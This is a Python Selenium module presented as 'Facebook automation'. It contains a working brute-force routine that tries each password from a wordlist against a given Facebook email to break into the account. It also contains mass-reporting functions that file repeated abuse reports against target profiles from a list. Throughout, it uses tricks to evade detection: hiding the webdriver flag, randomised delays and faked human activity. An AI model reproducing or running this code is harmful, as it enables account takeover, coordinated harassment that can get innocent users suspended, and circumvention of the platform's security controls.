"""
Facebook Automation Module
Handles Facebook login, interactions and automation tasks.
Modernized version combining multiple Facebook automation scripts.
"""

import time
import random
import logging
import json
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException

class FacebookAutomation:
    """Main Facebook automation class with login, reporting, and interaction capabilities."""
    
    def __init__(self, config=None):
        """Initialize Facebook automation with configuration."""
        self.config = config or {}
        self.driver = None
        self.logged_in = False
        self.setup_logging()
        
    def setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('facebook_automation.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def setup_driver(self, headless=False):
        """Setup Chrome WebDriver with optimal configuration."""
        try:
            chrome_options = Options()
            if headless:
                chrome_options.add_argument("--headless")
            
            # Disable notifications and other distractions
            prefs = {
                "profile.default_content_setting_values.notifications": 2,
                "profile.default_content_settings.popups": 0,
                "profile.managed_default_content_settings.images": 2
            }
            chrome_options.add_experimental_option("prefs", prefs)
            
            # Additional options for stability
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            self.logger.info("WebDriver setup completed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to setup WebDriver: {e}")
            return False

    def wait_random(self, min_seconds=2, max_seconds=5):
        """Wait for a random amount of time to avoid detection."""
        wait_time = random.uniform(min_seconds, max_seconds)
        time.sleep(wait_time)

    def safe_find_element(self, by, value, timeout=10):
        """Safely find element with timeout and error handling."""
        try:
            element = WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((by, value))
            )
            return element
        except TimeoutException:
            self.logger.warning(f"Element not found: {by}={value}")
            return None

    def safe_click(self, element):
        """Safely click element with error handling."""
        try:
            if element:
                element.click()
                self.wait_random()
                return True
        except Exception as e:
            self.logger.error(f"Failed to click element: {e}")
        return False

    def login_facebook(self, email=None, password=None):
        """
        Login to Facebook with enhanced error handling and security measures.
        Combines login logic from multiple scripts.
        """
        try:
            if not self.driver:
                if not self.setup_driver():
                    return False
                    
            self.driver.get("https://www.facebook.com/")
            self.wait_random(3, 5)
            
            # Handle cookie consent if present
            try:
                cookie_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Accept All Cookies')]")
                if cookie_button:
                    cookie_button.click()
                    self.wait_random()
            except NoSuchElementException:
                pass
            
            # Get credentials if not provided
            if not email:
                email = input("Enter your email or phone number: ")
            if not password:
                password = input("Enter your password: ")
            
            # Find and fill email field
            email_field = self.safe_find_element(By.ID, "email")
            if not email_field:
                email_field = self.safe_find_element(By.NAME, "email")
                
            if email_field:
                email_field.clear()
                email_field.send_keys(email)
                self.wait_random()
            else:
                self.logger.error("Could not find email field")
                return False
            
            # Find and fill password field
            password_field = self.safe_find_element(By.ID, "pass")
            if not password_field:
                password_field = self.safe_find_element(By.NAME, "pass")
                
            if password_field:
                password_field.clear()
                password_field.send_keys(password)
                self.wait_random()
            else:
                self.logger.error("Could not find password field")
                return False
            
            # Click login button
            login_button = self.safe_find_element(By.NAME, "login")
            if not login_button:
                login_button = self.safe_find_element(By.XPATH, "//button[@type='submit']")
                
            if login_button:
                self.safe_click(login_button)
                self.wait_random(5, 8)
            else:
                self.logger.error("Could not find login button")
                return False
            
            # Check for successful login
            if "facebook.com" in self.driver.current_url and "login" not in self.driver.current_url:
                self.logged_in = True
                self.logger.info("Login successful")
                
                # Handle any post-login popups
                self.handle_post_login_popups()
                return True
            else:
                self.logger.error("Login failed")
                return False
                
        except Exception as e:
            self.logger.error(f"Login error: {e}")
            return False

    def handle_post_login_popups(self):
        """Handle common popups after login."""
        try:
            # Handle "Save Login Info" popup
            not_now_buttons = self.driver.find_elements(By.XPATH, "//button[contains(text(), 'Not Now')]")
            for button in not_now_buttons:
                try:
                    button.click()
                    self.wait_random()
                    break
                except:
                    continue
                    
            # Handle notification permission popup
            try:
                block_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Block')]")
                if block_button:
                    block_button.click()
                    self.wait_random()
            except NoSuchElementException:
                pass
                
        except Exception as e:
            self.logger.warning(f"Error handling post-login popups: {e}")

    def report_account(self, account_url, report_count=1):
        """
        Report a Facebook account multiple times.
        Enhanced version combining logic from multiple reporting scripts.
        """
        if not self.logged_in:
            self.logger.error("Not logged in to Facebook")
            return False
            
        success_count = 0
        
        for i in range(report_count):
            try:
                self.logger.info(f"Starting report {i+1}/{report_count} for {account_url}")
                
                # Navigate to the account
                self.driver.get(account_url)
                self.wait_random(4, 6)
                
                # Find and click three dots menu
                three_dots = self.safe_find_element(
                    By.XPATH, 
                    "//div[@aria-label='More']|//div[contains(@aria-label, 'More')]"
                )
                
                if not three_dots:
                    # Try alternative selectors
                    three_dots = self.safe_find_element(
                        By.XPATH,
                        "//div[@role='button'][contains(@aria-label, 'More')]"
                    )
                
                if self.safe_click(three_dots):
                    self.wait_random(2, 3)
                    
                    # Find and click "Find support or report profile"
                    report_option = self.safe_find_element(
                        By.XPATH,
                        "//span[contains(text(), 'Find support or report')]|//span[contains(text(), 'Report')]"
                    )
                    
                    if self.safe_click(report_option):
                        self.wait_random(2, 3)
                        
                        # Select report reason (Something else/Other)
                        other_option = self.safe_find_element(
                            By.XPATH,
                            "//span[contains(text(), 'Something else')]|//span[contains(text(), 'Other')]"
                        )
                        
                        if self.safe_click(other_option):
                            self.wait_random(1, 2)
                            
                            # Submit report
                            submit_button = self.safe_find_element(
                                By.XPATH,
                                "//span[contains(text(), 'Submit')]|//div[@aria-label='Submit']"
                            )
                            
                            if self.safe_click(submit_button):
                                self.wait_random(2, 3)
                                
                                # Click Done if present
                                done_button = self.safe_find_element(
                                    By.XPATH,
                                    "//span[contains(text(), 'Done')]|//div[@aria-label='Done']"
                                )
                                
                                if done_button:
                                    self.safe_click(done_button)
                                
                                success_count += 1
                                self.logger.info(f"Report {i+1} submitted successfully")
                                
                                # Wait longer between reports to avoid detection
                                if i < report_count - 1:
                                    self.wait_random(30, 45)
                            else:
                                self.logger.error(f"Could not submit report {i+1}")
                        else:
                            self.logger.error(f"Could not select report reason for report {i+1}")
                    else:
                        self.logger.error(f"Could not find report option for report {i+1}")
                else:
                    self.logger.error(f"Could not find three dots menu for report {i+1}")
                    
            except Exception as e:
                self.logger.error(f"Error during report {i+1}: {e}")
                continue
        
        self.logger.info(f"Completed {success_count}/{report_count} reports")
        return success_count > 0

    def brute_force_login(self, email, password_file="passwords.txt"):
        """
        Brute force login attempt with password list.
        Enhanced version of the brute force functionality.
        """
        try:
            if not os.path.exists(password_file):
                self.logger.error(f"Password file not found: {password_file}")
                return False
                
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f.readlines()]
            
            self.logger.info(f"Starting brute force with {len(passwords)} passwords")
            
            for i, password in enumerate(passwords):
                if len(password) < 6:  # Skip short passwords
                    continue
                    
                self.logger.info(f"Trying password [{i+1}]: {password}")
                
                if self.login_facebook(email, password):
                    self.logger.info(f"SUCCESS! Password found: {password}")
                    return True
                    
                # Reset for next attempt
                self.driver.get("https://www.facebook.com/")
                self.wait_random(2, 4)
                
            self.logger.info("Brute force completed - no password found")
            return False
            
        except Exception as e:
            self.logger.error(f"Brute force error: {e}")
            return False

    def scroll_page(self, scroll_count=5):
        """Scroll page to simulate human behavior."""
        try:
            body = self.driver.find_element(By.TAG_NAME, "body")
            
            for i in range(scroll_count):
                # Scroll down
                body.send_keys(Keys.PAGE_DOWN)
                self.wait_random(1, 2)
                
                # Occasionally scroll up
                if random.choice([True, False]):
                    body.send_keys(Keys.PAGE_UP)
                    self.wait_random(1, 2)
                    
        except Exception as e:
            self.logger.error(f"Error during scrolling: {e}")

    def like_posts(self, max_likes=5):
        """Like posts on the news feed."""
        try:
            likes_count = 0
            like_buttons = self.driver.find_elements(By.XPATH, "//div[@aria-label='Like']")
            
            for button in like_buttons[:max_likes]:
                try:
                    if self.safe_click(button):
                        likes_count += 1
                        self.logger.info(f"Liked post {likes_count}")
                        self.wait_random(3, 6)
                except:
                    continue
                    
            return likes_count
            
        except Exception as e:
            self.logger.error(f"Error liking posts: {e}")
            return 0

    def simulate_human_activity(self, duration_minutes=10):
        """
        Simulate human-like activity on Facebook.
        Enhanced version combining multiple automation behaviors.
        """
        if not self.logged_in:
            self.logger.error("Not logged in to Facebook")
            return False
            
        try:
            end_time = time.time() + (duration_minutes * 60)
            activity_count = 0
            
            while time.time() < end_time:
                # Random activity selection
                activities = [
                    self.scroll_page,
                    lambda: self.like_posts(2),
                    lambda: self.wait_random(10, 20)  # Just wait/read
                ]
                
                activity = random.choice(activities)
                activity()
                activity_count += 1
                
                # Random break
                if activity_count % 5 == 0:
                    self.wait_random(30, 60)
                    
            self.logger.info(f"Completed {activity_count} activities in {duration_minutes} minutes")
            return True
            
        except Exception as e:
            self.logger.error(f"Error during human activity simulation: {e}")
            return False

    def mass_report_from_list(self, accounts_file, reports_per_account=1):
        """
        Mass report accounts from a list file.
        """
        try:
            if not os.path.exists(accounts_file):
                self.logger.error(f"Accounts file not found: {accounts_file}")
                return False
                
            with open(accounts_file, 'r') as f:
                accounts = [line.strip() for line in f.readlines() if line.strip()]
            
            self.logger.info(f"Starting mass report for {len(accounts)} accounts")
            
            total_reports = 0
            for i, account_url in enumerate(accounts):
                self.logger.info(f"Processing account {i+1}/{len(accounts)}: {account_url}")
                
                if self.report_account(account_url, reports_per_account):
                    total_reports += reports_per_account
                    
                # Wait between accounts to avoid detection
                if i < len(accounts) - 1:
                    self.wait_random(60, 120)
            
            self.logger.info(f"Mass reporting completed. Total reports: {total_reports}")
            return total_reports > 0
            
        except Exception as e:
            self.logger.error(f"Error during mass reporting: {e}")
            return False

    def save_session(self, session_file="facebook_session.json"):
        """Save current session data."""
        try:
            if self.driver:
                cookies = self.driver.get_cookies()
                session_data = {
                    'cookies': cookies,
                    'current_url': self.driver.current_url,
                    'logged_in': self.logged_in
                }
                
                with open(session_file, 'w') as f:
                    json.dump(session_data, f, indent=2)
                    
                self.logger.info(f"Session saved to {session_file}")
                return True
                
        except Exception as e:
            self.logger.error(f"Error saving session: {e}")
            return False

    def load_session(self, session_file="facebook_session.json"):
        """Load saved session data."""
        try:
            if not os.path.exists(session_file):
                self.logger.info("No saved session found")
                return False
                
            with open(session_file, 'r') as f:
                session_data = json.load(f)
            
            if not self.driver:
                if not self.setup_driver():
                    return False
            
            self.driver.get("https://www.facebook.com/")
            self.wait_random(2, 3)
            
            # Load cookies
            for cookie in session_data.get('cookies', []):
                try:
                    self.driver.add_cookie(cookie)
                except:
                    continue
            
            # Navigate to saved URL
            saved_url = session_data.get('current_url', 'https://www.facebook.com/')
            self.driver.get(saved_url)
            self.wait_random(3, 5)
            
            # Check if still logged in
            if "facebook.com" in self.driver.current_url and "login" not in self.driver.current_url:
                self.logged_in = True
                self.logger.info("Session restored successfully")
                return True
            else:
                self.logger.info("Session expired, manual login required")
                return False
                
        except Exception as e:
            self.logger.error(f"Error loading session: {e}")
            return False

    def cleanup(self):
        """Clean up resources."""
        try:
            if self.driver:
                self.driver.quit()
                self.driver = None
            self.logged_in = False
            self.logger.info("Cleanup completed")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")

    def __enter__(self):
        """Context manager entry."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        self.cleanup()


# Compatibility functions for existing scripts
def report_account_simple(email, password, account_url, report_count):
    """Simple wrapper function for backward compatibility."""
    with FacebookAutomation() as fb:
        if fb.login_facebook(email, password):
            return fb.report_account(account_url, report_count)
    return False

def brute_force_simple(email, password_file):
    """Simple wrapper function for brute force."""
    with FacebookAutomation() as fb:
        return fb.brute_force_login(email, password_file)
